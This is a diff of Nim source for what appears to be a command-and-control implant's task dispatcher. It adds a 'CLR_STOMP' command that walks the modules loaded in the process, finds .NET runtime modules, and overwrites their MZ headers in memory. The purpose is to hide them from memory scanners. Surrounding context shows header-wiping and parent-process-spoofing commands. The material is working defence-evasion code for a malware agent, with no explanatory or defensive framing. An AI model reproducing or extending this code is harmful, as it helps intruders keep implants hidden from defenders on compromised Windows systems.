@@ -1715,6 +1715,31 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     wipeMZHeader()
     t.sendResult(id, "[+] MZ header wiped", "")
 
+  of "CLR_STOMP":
+    when defined(windows):
+      var stomped = 0
+      let snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, 0)
+      if snap != INVALID_HANDLE_VALUE:
+        var me: MODULEENTRY32
+        me.dwSize = DWORD(sizeof(MODULEENTRY32))
+        if Module32First(snap, addr me) != 0:
+          while true:
+            let modName = ($cast[cstring](addr me.szModule[0])).toLowerAscii()
+            if "clr" in modName or "mscor" in modName:
+              let base = cast[ptr uint8](me.modBaseAddr)
+              if base != nil and base[] == 0x4D and cast[ptr uint8](cast[uint](base) + 1)[] == 0x5A:
+                var oldProt: DWORD = 0
+                discard VirtualProtect(cast[LPVOID](base), 2, PAGE_READWRITE, addr oldProt)
+                base[]                                                   = 0'u8
+                cast[ptr uint8](cast[uint](base) + 1)[]                  = 0'u8
+                discard VirtualProtect(cast[LPVOID](base), 2, oldProt, addr oldProt)
+                inc stomped
+            if Module32Next(snap, addr me) == 0: break
+        discard CloseHandle(snap)
+      t.sendResult(id, "[+] stomped " & $stomped & " CLR module header(s)", "")
+    else:
+      t.sendResult(id, "", "CLR_STOMP: Windows only")
+
   of "PPID":
     when defined(windows):
       try:
